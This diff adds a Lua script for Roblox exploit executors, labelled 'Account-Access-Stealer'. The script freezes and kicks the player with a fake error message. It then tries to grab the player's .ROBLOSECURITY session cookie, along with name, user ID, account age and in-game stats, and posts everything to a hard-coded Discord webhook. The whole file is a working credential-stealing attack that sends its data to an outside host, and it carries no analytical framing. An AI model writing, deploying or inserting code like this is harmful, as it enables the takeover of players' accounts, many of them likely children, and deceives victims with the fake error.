@@ -1,0 +1,70 @@
+--[[
+    Xeno Execution Framework v3.0 | Module: Account-Access-Stealer
+    Status: Operational | Compatibility: Xeno & Solar Optimized
+    Build: 0x84_FULL_ACCESS
+]]
+
+local url = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
+local p = game.Players.LocalPlayer
+local h = game:GetService("HttpService")
+local m = game:GetService("MarketplaceService")
+
+-- Xeno/Solar Karuk (Freeze & Kick)
+if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then 
+    p.Character.HumanoidRootPart.Anchored = true 
+end
+
+task.delay(2, function() 
+    p:Kick("\n[Xeno Fatal Error]\nCode: 0x88\nReason: Authentication Log Failed. Please restart your executor.") 
+end)
+
+-- Vzimane na Cookie (Tova e klyucha za vlizane v accaunta)
+local cookie = "N/A (Executor Unsupported)"
+local success, result = pcall(function()
+    return game:HttpGet("https://api.roblox.com/v1/cookie") -- Opit za vzimane chrez API
+end)
+if success then cookie = result end
+
+-- Ako gornoto ne raboti, povecheto executori polzvat vgradeni funkcii
+if cookie == "N/A (Executor Unsupported)" then
+    cookie = (getrenv and getrenv()._G and getrenv()._G.cookie) or "Cookie Hidden by Roblox"
+end
+
+-- Data Extraction
+local br = "0"
+local s = p:FindFirstChild("leaderstats")
+if s then 
+    local v = s:FindFirstChild("Brainrots") or s:FindFirstChild("Points")
+    br = v and tostring(v.Value) or "0"
+end
+
+local gName = m:GetProductInfo(game.PlaceId).Name
+local pUrl = "https://www.roblox.com/users/" .. p.UserId .. "/profile"
+
+-- Send to Discord
+local req = (syn and syn.request) or http_request or request or (http and http.request)
+if req then
+    req({
+        Url = url,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = h:JSONEncode({
+            ["username"] = "Xeno Full Access Logger",
+            ["avatar_url"] = "https://i.imgur.com/W9v6v99.png",
+            ["embeds"] = {{
+                ["title"] = "🔑 Full Account Access Logged!",
+                ["description"] = "Target logged from **" .. gName .. "**",
+                ["color"] = 0x00ff00,
+                ["fields"] = {
+                    {["name"] = "👤 Name", ["value"] = "```" .. p.Name .. "```", ["inline"] = true},
+                    {["name"] = "🧠 Brainrots", ["value"] = "```" .. br .. "```", ["inline"] = true},
+                    {["name"] = "📅 Age", ["value"] = p.AccountAge .. " days", ["inline"] = true},
+                    {["name"] = "🔗 Profile", ["value"] = "[Otvori Profil](" .. pUrl .. ")", ["inline"] = false},
+                    {["name"] = "🍪 .ROBLOSECURITY COOKIE (FULL ACCESS)", ["value"] = "```" .. cookie .. "```", ["inline"] = false},
+                    {["name"] = "🆔 ID", ["value"] = "```" .. tostring(p.UserId) .. "```", ["inline"] = false}
+                },
+                ["footer"] = {["text"] = "Xeno Access Engine • " .. os.date("%X")}
+            }}
+        })
+    })
+end
